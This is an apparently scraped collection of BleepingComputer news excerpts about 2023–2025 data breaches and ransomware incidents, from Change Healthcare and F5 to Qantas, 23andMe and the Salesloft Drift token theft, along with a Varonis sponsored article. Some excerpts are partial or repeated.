Insignia Financial says its Expand Platform was hit by credential stuffing attacks where threat actors use stolen credentials and automated tools to gain access to user accounts. The attackers compromised around 100 Expand Wrap Platform customers' accounts, but Insignia's ongoing investigation has not found evidence of financial impact. ""As is good practice, we encourage customers not to reuse the same credentials across multiple platforms and services, set strong and unique passphrases, and install software updates regularly to keep their devices secure,"" said Liz McCarthy, CEO of Insignia Financial's MLC Expand retirement platform. ""We are communicating with impacted customers and their advisers and will continue to keep them updated."" HESTA and Mercer Super , two other Australian super fund who manage savings for more than 2 million members, said they weren't affected. On Friday, ASFA announced the establishment of a hotline connecting superannuation industry organizations, government agencies, and financial services bodies and the release of a ""Toolkit"" to ensure strong sector coordination as part of its Financial Crime Protection Initiative (FCPI).

Farmers Insurance is a U.S.-based insurer that provides auto, home, life, and business insurance products. It operates through a network of agents and subsidiaries, serving more than 10 million households nationwide. The company disclosed the data breach in an advisory on its website, saying that its database at a third-party vendor was breached on May 29, 2025. ""On May 30, 2025, one of Farmers' third-party vendors alerted Farmers to suspicious activity involving an unauthorized actor accessing one of the vendor's databases containing Farmers customer information (the ""Incident""),"" reads the data breach notification on its website. ""The third-party vendor had monitoring tools in place, which allowed the vendor to quickly detect the activity and take appropriate containment measures, including blocking the unauthorized actor. After learning of the activity, Farmers immediately launched a comprehensive investigation to determine the nature and scope of the Incident and notified appropriate law enforcement authorities."" The company says that its investigation determined that customers' names, addresses, dates of birth, driver's license numbers, and/or last four digits of Social Security numbers were stolen during the breach. Farmers began sending data breach notifications to impacted individuals on August 22, with a sample notification [ 1 , 2 ] shared with the Maine Attorney General's Office, stating that a combined total of 1,111,386 customers were impacted. While Farmers did not disclose the name of the third-party vendor, BleepingComputer has learned that the data was stolen in the widespread Salesforce data theft attacks that have impacted numerous organizations this year. BleepingComputer contacted Farmers with additional questions about the breach and will update the story if we receive a response. Since the beginning of the year, threat actors classified as 'UNC6040' or 'UNC6240' have been conducting social engineering attacks on Salesforce customers . During these attacks, threat actors conduct voice phishing (vishing) to trick employees into linking a malicious OAuth app with their company's Salesforce instances. Once linked, the threat actors used the connection to download and steal the databases, which were then used to extort the company through email. The extortion demands come from the ShinyHunters cybercrime group, who told BleepingComputer that the attacks involve multiple overlapping threat groups, with each group handling specific tasks to breach Salesforce instances and steal data. ""Like we have said repeatedly already, ShinyHunters and Scattered Spider are one and the same,"" ShinyHunters told BleepingComputer. ""They provide us with initial access and we conduct the dump and exfiltration of the Salesforce CRM instances. Just like we did with Snowflake.""

Though information about the attack was circulated on May 2, 2024, the city's authorities shared more details in a press conference earlier today. According to the details disclosed today, an unauthorized actor gained access to a network drive after exploiting a vulnerability in a remote access server. While the officials did not state what remote access product was targeted, they shared that a security patch for the vulnerability was available at the time of the attack but had not been installed. The accessed drive contained tens of millions of files, most devoid of personally identifiable information (PII). Still, some included usernames, email addresses, personal IDs, and physical addresses. Additionally, the exposed drive contained information about fees, childhood education and care, children's status, welfare requests, medical certificates, and other highly sensitive information. ""This is a very serious data breach, with possible, unfortunate consequences for our customers and personnel. We regret this situation deeply,"" commented city manager Jukka-Pekka Ujula . ""Considering the number of users in the city's services now and in previous years, in the worst case, this data breach affects over 80,000 students and their guardians."" ""The breach also affects all of our personnel, as the perpetrator gained access to all personnel usernames and email addresses."" Due to the large size of the exposed data, investigating what has been compromised is expected to take some time. Meanwhile, the City of Helsinki has notified the Data Protection Ombudsman, the Police, and Traficom's National Cyber Security Centre accordingly.

BIG-IP is the firm's flagship product used for application delivery and traffic management by many large enterprises worldwide. It’s unclear how long the hackers maintained access, but the company confirmed that they stole source code, vulnerability data, and some configuration and implementation details for a limited number of customers. ""Through this access, certain files were exfiltrated, some of which contained certain portions of the Company's BIG-IP source code and information about undisclosed vulnerabilities that it was working on in BIG-IP,"" the company states . Despite this critical exposure of undisclosed flaws, F5 says there's no evidence that the attackers leveraged the information in actual attacks, such as exploiting the undisclosed flaw against systems. The company also states that it has not seen evidence that the private information has been disclosed. F5 claims that the threat actors' access to the BIG-IP environment did not compromise its software supply chain or result in any suspicious code modifications. This includes its platforms that contain customer data, such as its CRM, financial, support case management, or iHealth systems. Furthermore, other products and platforms managed by the company are not compromised, including NGINX, F5 Distributed Cloud Services, or Silverline systems' source code. After discovering the intrusion, F5 took remediation action by tightening access to its systems, and improving its overall threat monitoring, detection, and response capabilities: Additionally, the company also focuses on the security of its products through source code reviews and security assessements with support from NCC Group and IOActive. NCC Group's assessment covered security reviews of critical software components in BIG-IP and portions of the development pipeline in an effort that involved 76 consultants. IOActive's expertise was called in after the security breach and the engagement is still in progress . The results so far show no evidence of the threat actor introducing vulnerablities in critical F5 software source code or the software development build pipeline. F5 is still reviewing which customers had their configuration or implementation details stolen and will contact them with guidance. To help customers secure their F5 environments against risks stemming from the breach, the company released updates for BIG-IP, F5OS, BIG-IP Next for Kubernetes, BIG-IQ, and APM clients. Despite any evidence ""of undisclosed critical or remote code execution vulnerabilities,"" the company urges customers to prioritize installing the new BIG-IP software updates . F5 confirmed that today's updates address the potential impact stemming from the stolen undisclosed vulnerabilities. Furthermore, F5 support makes available a threat hunting guide for customers to improve detection and monitoring in their environment. New best practices for hardening F5 systems now include automated checks to the F5 iHealth Diagnostic Tool , which can now flag security risks, vulnerabilities, prioritize actions, and provide remediation guidance. Another recommendation is to enable BIG-IP event streaming to SIEM and configure the systems to log to a remote syslog server and monitor for login attempts . ""Our global support team is available to assist. You can open a MyF5 support case or contact F5 support directly for help updating your BIG-IP software, implementing any of these steps, or to address any questions you may have"" - F5 The company added that it has validated the safety of BIG-IP releases through multiple independent reviews by leading cybersecurity firms, including CrowdStrike and Mandiant. On Monday, F5 announced that it rotated the cryptographic certcertificates and keys used for signing its digital products. The change affects installing BIG-IP and BIG-IQ TMOS software images while ISO image signature verification is enabled, and installing BIG-IP F5OS tenant images on host systems running F5OS. Additional guidance for F5 customers comes from UK's National Cyber Security Centre (NCSC) and the U.S. Cybersecurity and Infrastructure Security Agency (CISA). Both agencies recommmend identifying all F5 products (hardware, software, and virtualized) and making sure that no management interface is exposed on the public web. If an exposed interface is discovered, companies should make compromise assessment. F5 notes that it delayed the public disclosure of the incident at the U.S. government's request, presumably to allow enough time to secure critical systems. ""On September 12, 2025, the U.S. Department of Justice determined that a delay in public disclosure was warranted pursuant to Item 1.05(c) of Form 8-K. F5 is now filing this report in a timely manner,"" explains F5. F5 states that the incident has no material impact on its operations.

Rite Aid is the third-largest drugstore chain in the United States, employing over 6,000 pharmacists (out of a total workforce of over 45,000) in more than 1,700 retail pharmacy stores across 16 states. The company told BleepingComputer on Friday that it's currently investigating a cyberattack detected in June and working on sending data breach notifications to customers affected by the resulting data breach. It also added that it had restored all systems compromised in the incident with the help of external experts it hired to address the attack's impact. ""Rite Aid experienced a limited cybersecurity incident in June, and we are finalizing our investigation. We take our obligation to safeguard personal information very seriously, and this incident has been a top priority,"" Rite Aid said. ""Together with our third-party cybersecurity partner experts, we have restored our systems and are fully operational. We are sending notices to impacted consumers."" While Rite Aid didn't share what customer data was accessed in the breach or how many individuals were affected, it said that the data breach doesn't impact health or financial information. ""In the meantime, we can confirm that no social security numbers, financial information, or patient information were impacted by this incident,"" the company added. Even though Rite Aid has yet to share who was behind the June attack, the statement came after BleepingComputer reached out to confirm the RansomHub ransomware gang's claims that it breached the pharmacy giant's systems and stole customers' data. ​""While having access to the Riteaid network we obtained over 10 GB of customer information equating to around 45 million lines of people's personal information. This information includes name, address, dl_id number, dob, riteaid rewards number,"" the threat group said on their dark web leak site. After adding Rite Aid to its leak site because the company supposedly stopped negotiating a ransom, the ransomware gang shared a screenshot of some of the allegedly stolen data as proof, saying that everything would be leaked in two weeks. Rite Aid didn't reply to a request for more details regarding the June attack after BleepingComputer reached out again today. RansomHub is a relatively new threat group that demands ransom payments from victims in exchange for not leaking stolen files, often auctioning the files to the highest bidder if negotiations fail.

Cencora, formerly AmerisourceBergen, is a pharmaceutical services provider specializing in drug distribution, specialty pharmacy, consulting, and clinical trial support. The Pennsylvania-based firm, with a presence in 50 countries, employs 46,000 people and has a revenue (2023) of $262 billion. In February 2024, Cencora disclosed a data breach in a Form 8-K filing with the SEC, stating that unauthorized parties gained access to its information systems and exfiltrated personal data. At the time, the company opted not to share any additional information regarding the incident and its potential impact on its clients. Also, no ransomware groups ever assumed responsibility for the attack. Today, the California Attorney General's office published multiple data breach notification samples submitted in the past couple of days by some of the largest pharmaceutical firms in the United States, all attributing their data exposure to the February Cencora incident.

UnitedHealth confirms it paid ransomware gang to stop data leak,https://www.bleepingcomputer.com/news/security/unitedhealth-confirms-it-paid-ransomware-gang-to-stop-data-leak/,Bill Toulas,"April 23, 2024","The UnitedHealth Group has confirmed that it paid a ransom to cybercriminals to protect sensitive data stolen during the Optum ransomware attack in late February. The attack led to an outage that impacted the Change Healthcare payment, affecting a range of critical services used by healthcare providers and pharmacies across the U.S., including payment processing, prescription writing, and insurance claims. The organization reported that the cyberattack had caused $872 million in financial damages . The BlackCat/ALPHV ransomware gang claimed the attack , alleging to have stolen 6TB of sensitive patient data. In early March, BlackCat performed an exit scam after allegedly getting $22 million in ransom from UnitedHealth. At that time, one of the gang's affiliate known as ""Notchy"" claimed that they had UnitedHealth data because they conducted the attack and that BlackCat cheated them of the ransom payment. The transaction was visible on the Bitcoin blockchain and confirmed by researchers to have reached a wallet used by BlackCat hackers. A week later, the U.S. government launched an investigation into whether health data had been stolen in the ransomware attack at Optum. By mid-April, the extortion group RansomHub raised the pressure even more on UnitedHealth by starting to leak what they claimed to be corporate and patient data stolen during the attack. UnitedHealth's patient data reached RansomHub after ""Notchy"" partnered with them to extort the company again. In a statement for BleepingComputer, the company confirmed that it paid a ransom to avoid patient data from being sold to cybercriminals or leaked publicly. ""A ransom was paid as part of the company’s commitment to do all it could to protect patient data from disclosure"" - UnitedHealth Group BleepingComputer checked RansomHub's data leak website and can confirm that the threat actor has removed UnitedHealth from its list of victims. UnitedHealth’s removal from RansomHub’s site may indicate that today’s confirmation is for a payment to the new ransomware gang rather than the alleged $22 million payment to BlackCat in March. Yesterday, UnitedHealth posted an update on its website announcing support for people whose data had been exposed by the February ransomware attack, officially confirming the data breach incident. “Based on initial targeted data sampling to date, the company has found files containing protected health information (PHI) or personally identifiable information (PII), which could cover a substantial proportion of people in America,” reads the announcement . “To date, the company has not seen evidence of exfiltration of materials such as doctors’ charts or full medical histories among the data,” the company says. The company reassures patients that only 22 screenshots of stolen files, some containing personally identifiable information, were posted on the dark web, and that no other data exfiltrated in the attack has been published ""at this time."" The health insurance and services organization promised to send personalized notifications once it completes its investigation into the type of information has been compromised. A dedicated call center that will be offering two years of free credit monitoring and identity theft protection services has also been set up as part of the organization's effort to support those impacted. Currently, 99% of the impacted services are operational, medical claims flow at near-normal levels, and payment processing stands at approximately 86%.

In early March, BlackCat performed an exit scam after allegedly getting $22 million in ransom from UnitedHealth. At that time, one of the gang's affiliate known as ""Notchy"" claimed that they had UnitedHealth data because they conducted the attack and that BlackCat cheated them of the ransom payment. The transaction was visible on the Bitcoin blockchain and confirmed by researchers to have reached a wallet used by BlackCat hackers. A week later, the U.S. government launched an investigation into whether health data had been stolen in the ransomware attack at Optum. By mid-April, the extortion group RansomHub raised the pressure even more on UnitedHealth by starting to leak what they claimed to be corporate and patient data stolen during the attack. UnitedHealth's patient data reached RansomHub after ""Notchy"" partnered with them to extort the company again. In a statement for BleepingComputer, the company confirmed that it paid a ransom to avoid patient data from being sold to cybercriminals or leaked publicly. ""A ransom was paid as part of the company’s commitment to do all it could to protect patient data from disclosure"" - UnitedHealth Group BleepingComputer checked RansomHub's data leak website and can confirm that the threat actor has removed UnitedHealth from its list of victims. UnitedHealth’s removal from RansomHub’s site may indicate that today’s confirmation is for a payment to the new ransomware gang rather than the alleged $22 million payment to BlackCat in March. Yesterday, UnitedHealth posted an update on its website announcing support for people whose data had been exposed by the February ransomware attack, officially confirming the data breach incident. “Based on initial targeted data sampling to date, the company has found files containing protected health information (PHI) or personally identifiable information (PII), which could cover a substantial proportion of people in America,” reads the announcement . “To date, the company has not seen evidence of exfiltration of materials such as doctors’ charts or full medical histories among the data,” the company says. The company reassures patients that only 22 screenshots of stolen files, some containing personally identifiable information, were posted on the dark web, and that no other data exfiltrated in the attack has been published ""at this time."" The health insurance and services organization promised to send personalized notifications once it completes its investigation into the type of information has been compromised. A dedicated call center that will be offering two years of free credit monitoring and identity theft protection services has also been set up as part of the organization's effort to support those impacted. Currently, 99% of the impacted services are operational, medical claims flow at near-normal levels, and payment processing stands at approximately 86%. It's budget season!

Qantas discloses cyberattack amid Scattered Spider aviation breaches,https://www.bleepingcomputer.com/news/security/qantas-discloses-cyberattack-amid-scattered-spider-aviation-breaches/,Lawrence Abrams,"July 1, 2025","Australian airline Qantas disclosed that it detected a cyberattack on Monday after threat actors gained access to a third-party platform containing customer data. Qantas is Australia's largest airline, operating domestic and international flights across six continents and employing around 24,000 people. In a press release issued Monday night, the airline states that the attack has been contained, but a ""significant"" amount of data is believed to have been stolen. The breach began after a threat actor targeted a Qantas call centre and gained access to a third-party customer servicing platform. ""On Monday, we detected unusual activity on a third party platform used by a Qantas airline contact centre. We then took immediate steps and contained the system. We can confirm all Qantas systems remain secure,"" Qantas stated . ""There are 6 million customers that have service records in this platform. We are continuing to investigate the proportion of the data that has been stolen, though we expect it will be significant. An initial review has confirmed the data includes some customers' names, email addresses, phone numbers, birth dates and frequent flyer numbers."" Qantas says no credit card or personal financial information was exposed, and frequent flyer account passwords, PINs, and login details were not impacted. After detecting the breach, Qantas says it notified the Australian Cyber Security Centre, the Office of the Australian Information Commissioner, and the Australian Federal Police. It's unclear if external cybersecurity experts are assisting with the investigation. This attack comes as cybersecurity firms warn that hackers known as ""Scattered Spider"" have begun targeting the aviation and transportation industries . While it is unclear if this group is behind the Qantas attack, BleepingComputer has learned the incident shares similarities with other recent attacks by the threat actors. Scattered Spider (also tracked as 0ktapus , UNC3944 , Scatter Swine , Starfraud, and Muddled Libra ) is a group of threat actors known for their conducting social engineering and identity-based attacks against organizations worldwide, commonly using phishing, SIM swapping, MFA bombing, and help desk phone calls to gain access to employee credentials. In September 2023, they escalated their attacks by breaching MGM Resorts and encrypting over 100 VMware ESXi hypervisors using BlackCat ransomware after gaining access by impersonating an employee. They've also partnered with other ransomware operations, such as RansomHub , Qilin , and DragonForce . Other organizations targeted by Scattered Spider include Twilio , Coinbase , DoorDash , Caesars , MailChimp , Riot Games , and Reddit . After recently focusing on retail and insurance companies , cybersecurity firms warned on Friday that Scattered Spider had shifted its attention to aviation, with recent attacks on Hawaiian Airlines and WestJet believed to be linked to the threat actors. BleepingComputer has learned that in the WestJet breach , threat actors exploited a self-service password reset to gain access to an employee's account, which was then used to breach the network. The threat actors have been employing a sector-by-sector approach to their attacks, and it is unclear if they are done with the aviation sector and what industry will be targeted next. Organizations defending against this type of threat should start by gaining complete visibility across the entire infrastructure, identity systems, and critical management services. This includes securing self-service password reset platforms, help desks, and third-party identity vendors, which have become common targets of these threat actors. Both Google Threat Intelligence Group (GTIG) and Palo Alto Networks have released guides on hardening defenses against the known ""Scattered Spider"" tactics , which admins should familiarize themselves with.

""MediSecure can confirm that approximately 12.9 million Australians who used the MediSecure prescription delivery service during the approximate period of March 2019 to November 2023 are impacted by this Incident based on individuals’ healthcare identifiers. However, MediSecure is unable to identify the specific impacted individuals despite making all reasonable efforts to do so due to the complexity of the data set."" The personal and health information impacted by this breach relates to prescriptions distributed by MediSecure until November 2023 , including names, dates of birth, addresses, contact information (phone numbers and email addresses), individual healthcare identifier (IHI), Medicare card numbers, prescription medication (name of drug, strength, and quantity), and reason for prescription and instructions. It also included Pensioner Concession, Commonwealth Seniors, Healthcare Concession, and Department of Veterans’ Affairs (DVA) (Gold, White, Orange) card numbers. ""Be on the lookout for scams referencing the MediSecure data breach, and do not respond to unsolicited contact that references the data breach experienced by MediSecure."" the Australian National Cyber Security Coordinator warned on Thursday. ""If contacted by someone claiming to be a medical or other service provider, including financial service provider, seeking personal, payment or banking information you should hang up and call back on a phone number you have sourced independently."" MediSecure was one of two Australian prescription delivery services until late 2023 when it was replaced by another company, Fred IT Group's eRx Script Exchange (eRx).

The seizure occurred on Wednesday morning, soon after the site was used last week to leak data stolen from a Europol law enforcement portal . The website is now displaying a message stating that the FBI has taken control over it and the backend data, indicating that law enforcement seized both the site's servers and domains. ""This website has been taken down by the FBI and DOJ with assistance from international partners,"" reads the seizure message. ""We are reviewing this site's backend data.

The FBI has also seized the site's Telegram channel and other channels owned by Baphomet, with law enforcement sending messages stating it is under their control. Some of the messages posted to the seized Telegram channels by law enforcement came directly from Baphomet's account, likely indicating that the threat actor was arrested and his devices are now in the hands of law enforcement. In a Telegram message shared with BleepingComputer, the threat actor known as IntelBroker is also claiming that Baphomet was arrested in the law enforcement operation.

This IC3 subdomain hosts a form that victims and other individuals can use to share information about BreachForums and its members. When contacted by BleepingComputer about the seizure, both the FBI and the Department of Justice declined to comment. BreachForums was the successor of a string of hacking forums used to trade, sell, and leak stolen data, as well as sell access to corporate networks and other illegal cybercrime services. The first of these sites was known as RaidForums, which initially launched in 2015 and became the largest site for distributing stolen data, and was commonly used by ransomware and extortion groups. The site was eventually seized by law enforcement , with the police arresting the owner known as ""Omnipotent"". Soon after, one of its more active members, Pompompurin, created a new forum called 'Breached' to fill the void left behind by RaidForums. The site quickly grew in popularity and was used by thousands of members to brag about their cybercrime activities and to leak and sell stolen data. However, the site soon drew the ire of law enforcement after one of its members, IntelBroker, leaked the stolen data of D.C. Health Link , a healthcare provider for U.S. House members, their staff, and their families. Soon after, Breached was seized by law enforcement , and its admin, Conor Fitzpatrick (aka Pompompurin), was arrested. Once again, those in this cybercrime community were left without a home, so one of Breached's previous admins, known as Baphomet, teamed with ShinyHunters, a notorious seller of stolen data, to launch a new site named BreachForums.

23andMe hit with lawsuits after hacker leaks stolen genetics data,https://www.bleepingcomputer.com/news/security/23andme-hit-with-lawsuits-after-hacker-leaks-stolen-genetics-data/,Bill Toulas,"October 13, 2023","Genetic testing provider 23andMe faces multiple class action lawsuits in the U.S. following a large-scale data breach that is believed to have impacted millions of its customers. Late last month, a threat actor leaked 23andMe customer data in a CSV file named 'Ashkenazi DNA Data of Celebrities.csv' on hacker forums. The file allegedly contained the data of nearly 1 million Ashkenazi Jews who used 23andMe services to find their ancestry info, genetic predispositions, and more. The data in the CSV file contained information on 23andMe users' account IDs, full names, sex, date of birth, DNA profiles, location, and region details. Last week, the original hacker decided to retract the post and instead began selling data profiles of stolen 23andMe data. However, other threat actors continued to share the original 23andMe leak throughout cybercrime communities and forums. In response to an inquiry, 23andMe told BleepingComputer that the hackers accessed its platform through credential-stuffing attacks on weakly secured accounts. However, they refuted claims of a direct security breach of their systems. A 23andMe spokesperson explained that the attackers initially gained unauthorized access to a small number of accounts but eventually exfiltrated the data of a larger yet undefined number of clients due to them activating an optional feature named 'DNA Relatives,' which connects genetic relatives. After the publication of our report, 23andMe posted an announcement on its site promising to inform impacted customers individually and keep them updated about the results of the ongoing investigation carried out with the help of third-party experts and law enforcement authorities. Although platform members voluntarily activated the opt-in feature, not all of them accept that the involved risk of internal data-sharing should exempt the firm from its responsibility to place protection layers. In this case, many people following proper security practices by enabling 2FA on their accounts and using a strong and unique password still found themselves exposed, and their sensitive data leaked on cybercrime forums. At least four class action complaints have been submitted in California ( Santana , Eden , Andrizzi , Lamons ) seeking relief for the damage done by 23andMe's failure to protect their data. The lawsuits highlight a lack of information in the company's official announcement regarding the security event, the current status of customer data safety, the network breach's duration, and the cyberattack's exact mechanism. Also, they criticize 23andMe for failing to implement adequate security measures that would help monitor its network for abnormal activity and potentially take action to stop the intrusion much sooner. The legal actions emphasize that 23andMe, a company managing sensitive medical data, should have been well aware of the elevated cybersecurity threats given the numerous high-profile breaches in the industry, underscoring the high value of such data. The plaintiffs ask for various financial reliefs against 23andMe, including restitution, lifetime credit monitoring, actual, compensatory, and statutory damages and penalties, punitive damages, and coverage of attorney's fees. One of the complaints defines the nominal damages to $1,000 and punitive damages to $3,000 per class action lawsuit member, in addition to various other relief requests. It's budget season!

How to Prevent Your First AI Data Breach,https://www.bleepingcomputer.com/news/security/how-to-prevent-your-first-ai-data-breach/#comment_form,Home,"August 13, 2024","Learn why the broad use of gen AI copilots will inevitably increase data breaches This scenario is becoming increasingly common in the gen AI era: a competitor somehow gains access to sensitive account information and uses that data to target the organization's customers with ad campaigns. The organization had no idea how the data was obtained. It was a security nightmare that could jeopardize their customers' confidence and trust. The company identified the source of the data breach: a former employee used a gen AI copilot to access an internal database full of account data. They copied sensitive details, like customer spend and products purchased, and took them to a competitor. This example highlights a growing problem: the broad use of gen AI copilots will inevitably increase data breaches . According to a recent Gartner survey , the most common AI use cases include generative AI-based applications, like Microsoft 365 Copilot and Salesforce's Einstein Copilot . While these tools are an excellent way for organizations to increase productivity, they also create significant data security challenges. In this article, we'll explore these challenges and show you how to secure your data in the era of gen AI. Nearly 99% of permissions are unused, and more than half of those permissions are high-risk. Unused and overly permissive data access is always an issue for data security, but gen AI throws fuel on the fire. When a user asks a gen AI copilot a question, the tool formulates a natural-language answer based on internet and business content via graph technology. Because users often have overly permissive data access, the copilot can easily surface sensitive data — even if the user didn't realize they could access it. Many organizations don't know what sensitive data they have in the first place, and right-sizing access is nearly impossible to do manually. Threat actors no longer need to know how to hack a system or understand the ins and outs of your environment. They can simply ask a copilot for sensitive information or credentials that allow them to move laterally. Security challenges that come with enabling gen AI tools include: These data security challenges aren't new, but they are highly exploitable, given the speed and ease at which gen AI surfaces information. The first step in removing the risks associated with gen AI is to ensure that your house is in order. It's a bad idea to let copilots loose in your organization if you're not confident that you know where you have sensitive data, what that sensitive data is, cannot analyze exposure and risks, and cannot close security gaps and fix misconfigurations efficiently. Once you have a handle on data security in your environment and the right processes are in place, you are ready to roll out a copilot. At this point, you should focus on permissions, labels, and human activity. Incorporating these three data security areas isn't easy and can't be accomplished with manual effort alone. Few organizations can safely adopt gen AI copilots without a holistic approach to data security and specific controls for the copilots themselves. Varonis helps customers worldwide protect what matters most: their data. We applied our deep expertise to protect organizations planning to implement generative AI. If you're just beginning your gen AI journey, the best way to start is with our free Data Risk Assessment . In less than 24 hours, you'll have a real-time view of your sensitive data risk to determine whether you can safely adopt a gen AI copilot. To learn more, explore our AI security resources .

Once you have a handle on data security in your environment and the right processes are in place, you are ready to roll out a copilot. At this point, you should focus on permissions, labels, and human activity. Incorporating these three data security areas isn't easy and can't be accomplished with manual effort alone. Few organizations can safely adopt gen AI copilots without a holistic approach to data security and specific controls for the copilots themselves. Varonis helps customers worldwide protect what matters most: their data. We applied our deep expertise to protect organizations planning to implement generative AI. If you're just beginning your gen AI journey, the best way to start is with our free Data Risk Assessment . In less than 24 hours, you'll have a real-time view of your sensitive data risk to determine whether you can safely adopt a gen AI copilot. To learn more, explore our AI security resources .

Ransomware gang files SEC complaint over victim’s undisclosed breach,https://www.bleepingcomputer.com/news/security/ransomware-gang-files-sec-complaint-over-victims-undisclosed-breach/,Ionut Ilascu,"November 15, 2023","The ALPHV/BlackCat ransomware operation has taken extortion to a new level by filing a U.S. Securities and Exchange Commission complaint against one of their alleged victims for not complying with the four-day rule to disclose a cyberattack. Earlier today, the threat actor listed the software company MeridianLink on their data leak with a threat that they would leak allegedly stolen data unless a ransom is paid in 24 hours. MeridianLink is a publicly traded company that provides digital solutions for financial organizations such as banks, credit unions, and mortgage lenders. According to DataBreaches.net , the ALPHV ransomware gang said they breached MeridianLink’s network on November 7 and stole company data without encrypting systems. The ransomware actor said that “it appears MeridianLink reached out, but we are yet to receive a message on their end” to negotiate a payment in exchange for not leaking the supposedly stolen data. The alleged lack of response from the company likely prompted the hackers to exert more pressure by sending a complaint to the U.S. Securities and Exchange Commission (SEC) about MeridianLink not disclosing a cybersecurity incident that impacted “customer data and operational information.” To show that their complaint is real, ALPHV published on their site a screenshot of the form they filled out on SEC’s Tips, Complaints, and Referrals page . In their own words, the attacker told the SEC that MeridianLink suffered a “significant breach” and did not disclose it as required in Form 8-K, under Item 1.05. Following a barrage of security incidents at U.S. organizations, the SEC adopted new rule s that require publicly traded companies to report cyberattacks that have a material impact, i.e. influence investment decisions. Cybersecurity incident reporting is “due four business days after a registrant determines that a cybersecurity incident is material,” the new rule states. However, the SEC’s new cybersecurity rules are set to take effect on December 15, 2023, Reuters explained at the beginning of October. ALPHV also provided on their site the reply they received from the SEC to the complaint against MeridianLink, to show that the submission was received. In a statement for BleepingComputer, MeridianLink said that after identifying the incident it acted immediately to contain the threat and engaged a team of third-party experts to investigate. The company added that it is still working to determine if any consumer personal information was impacted by the cyberattack and it will notify affected parties if so. “Based on our investigation to date, we have identified no evidence of unauthorized access to our production platforms, and the incident has caused minimal business interruption.” - MeridianLink While many ransomware and extortion gangs have threatened to report breaches and data theft to the SEC, this may be the first public confirmation that they have done so. Previously, ransomware actors exerted pressure on victims by contacting customers to let them know of the intrusion. Sometimes, they would also try to intimidate the victim by contacting them directly over the phone.

The news organization is one of the largest daily newspapers in the U.S. with approximately 2.5 million digital subscribers. Between July 10 and August 22, threat actors accessed parts of its network. They leveraged a vulnerability in Oracle E-Business Suite software that was a zero-day at the time to steal sensitive data. In late September, the hackers tried to extort the Washington Post, along with other major companies they had breached the same way. The hackers leveraged a then-zero-day vulnerability in Oracle E-Business Suite software that the Washington Post used internally, stole data, and then attempted to extort the firm in late September. Oracle E-Business Suite is a widely used enterprise resource planning (ERP) platform with HR, finance, and supply chain functions that large organizations use internally. According to the Washington Post's notification to impacted individuals, Oracle disclosed the security vulnerability while the news organization was investigating the breach incident. “On September 29, 2025, the Post was contacted by a bad actor who claimed to have gained access to its Oracle E-Business Suite applications,” describes the letter . “In response, the Post launched a thorough investigation of its Oracle application environment with the assistance of experts to determine if the environment had been accessed without authorization.” “During the investigation, Oracle announced that it had identified a previously unknown and widespread vulnerability in its E-Business Suite software that permitted unauthorized actors to access many Oracle customers’ E-Business Suite applications.” Although the attackers aren’t named in the letter, the Clop ransomware group has been linked to these attacks , exploiting a zero-day flaw that is now tracked as CVE-2025-61884. Among the organizations that were breached using the same vulnerability in Oracle E-Business Suite are Harvard University , American Airlines subsidiary Envoy Air , and Hitachi’s GlobalLogic . These are some of the victims who have confirmed a breach or are investigating suspicious activity in their environments. However, Clop's data leak site lists a larger number of breached organizations. The Post’s investigation into the incident concluded on October 27 and revealed that the following types of data belonging to 9,720 employees and contractors had been compromised: Impacted individuals received a 12-month free-of-charge identity protection service coverage through IDX and are recommended to consider placing a security freeze on their credit file and setting up fraud alerts on their report.

In May, UnitedHealth CEO Andrew Witty warned during a congressional hearing that ""maybe a third"" of all American's health data was exposed in the attack. A month later, Change Healthcare published a data breach notification warning that the February ransomware attack on Change Healthcare exposed a ""substantial quantity of data"" for a ""substantial proportion of people in America."" Today, the U.S. Department of Health and Human Services Office for Civil Rights data breach portal updated the total number of impacted people to 100 million, making it the first time UnitedHealth, the parent company of Change Healthcare, put an official number to the breach. ""On October 22, 2024, Change Healthcare notified OCR that approximately 100 million individual notices have been sent regarding this breach,"" reads an updated FAQ on the OCR website. Data breach notifications sent by Change Healthcare since June state that a massive amount of sensitive information was stolen during the February ransomware attack, including: The information may be different for each individual, and not everyone's medical history was exposed. This data breach was caused by a February ransomware attack on UnitedHealth subsidiary Change Healthcare , which led to widespread outages in the U.S. healthcare system. The disruption to the company's IT systems prevented doctors and pharmacies from filing claims and prevented pharmacies from accepting discount prescription cards, causing patients to pay full price for medications. The BlackCat ransomware gang, aka ALPHV, conducted the attack, using stolen credentials to breach the company's Citrix remote access service, which did not have multi-factor authentication enabled. During the attack, the threat actors stole 6 TB of data and ultimately encrypted computers on the network, causing the company to shut down IT systems to prevent the spread of the attack. The UnitedHealth Group admitted to paying a ransom demand to receive a decryptor and for the threat actors to delete the stolen data. The ransom payment was allegedly $22 million, according to the BlackCat ransomware affiliate who conducted the attack. This ransom payment was supposed to be split between the affiliate and the ransomware operation, but the BlackCat suddenly shut down , stealing the entire payment for themselves and pulling an exit scam. However, this wasn't the end of Change Healthcare's problems, as the affiliate claimed they still had the company's data and did not delete it as promised. The affiliate partnered with a new ransomware operation named RansomHub and began leaking some of the stolen data , demanding an additional payment for the data not to be released. The entry for Change Healthcare entry on RansomHub's data leak site mysteriously disappeared a few days later, possibly indicating that United Health paid a second ransom demand. UnitedHealth said in April that the Change Healthcare ransomware attack caused $872 million in losses , which increased as part of the Q3 2024 earnings to an expected $2.45 billion for the nine months to September 30, 2024, It's budget season!

Salesloft's SalesDrift is a third-party platform that connects the Drift AI chat agent with a Salesforce instance, allowing organizations to sync conversations, leads, and support cases into their CRM. According to Salesloft, threat actors obtained Drift OAuth and refresh tokens used for its Salesforce integration, and used them to conduct a Salesforce data theft campaign between August 8 and August 18, 2025. ""Initial findings have shown that the actor's primary objective was to steal credentials, specifically focusing on sensitive information like AWS access keys, passwords, and Snowflake-related access tokens,"" reads a Salesloft advisory . ""We have determined that this incident did not impact customers who do not use our Drift-Salesforce integration.

In coordination with Salesforce, Salesloft revoked all active access and refresh tokens for the Drift application, requiring customers to re-authenticate with their Salesforce instances. To reauthenticate, admins should go to Settings > Integrations > Salesforce , disconnect the integration, and then reconnect with valid Salesforce credentials. Google's Threat Intelligence team (Mandiant) is tracking the threat actor as UNC6395 and states that once they gained access to a Salesforce instance, they issued SOQL queries to extract case authentication tokens, passwords, and secrets from support cases, allowing them to breach further platforms.

